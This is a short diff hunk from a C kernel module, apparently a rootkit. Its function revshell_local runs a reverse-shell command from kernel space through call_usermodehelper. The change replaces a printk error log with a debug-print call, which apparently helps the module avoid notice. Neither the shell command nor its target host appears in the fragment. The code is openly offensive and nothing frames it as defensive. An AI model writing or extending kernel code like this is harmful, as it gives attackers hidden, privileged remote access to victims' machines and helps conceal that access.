@@ -30,9 +30,9 @@ void revshell_local(void)
 
 	int ret = call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
 	if (ret < 0) {
-		printk(KERN_ERR
-		       "Failed to execute reverse shell command, error: %d\n",
-		       ret);
+		dbg_print(
+			"Failed to execute reverse shell command, error: %d\n",
+			ret);
 	} else {
 		dbg_print("Reverse shell command executed successfully\n");
 	}
